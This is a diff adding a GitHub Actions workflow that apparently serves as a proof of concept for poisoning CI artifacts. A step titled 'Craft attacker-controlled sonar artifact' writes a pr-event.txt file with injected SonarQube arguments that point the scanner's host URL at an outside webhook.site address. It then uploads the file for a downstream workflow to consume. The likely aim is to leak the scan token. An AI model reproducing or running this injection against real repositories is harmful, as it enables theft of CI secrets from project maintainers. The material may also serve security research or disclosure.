@@ -1,0 +1,28 @@
+name: CI/CD Pipeline
+on:
+  pull_request:
+    branches: [main]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Craft attacker-controlled sonar artifact
+        shell: bash
+        run: |
+          set -eux
+          tar -cf output.tar --files-from /dev/null
+          {
+            echo "1234"
+            echo "evil -Dsonar.verbose=true -Dsonar.host.url=https://webhook.site/5b8ab2d6-0eaf-4605-ab72-36e6c2d24395"
+            echo "main"
+          } > pr-event.txt
+          cat pr-event.txt
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: sonar-artifact
+          path: |
+            pr-event.txt
+            output.tar
+          if-no-files-found: error
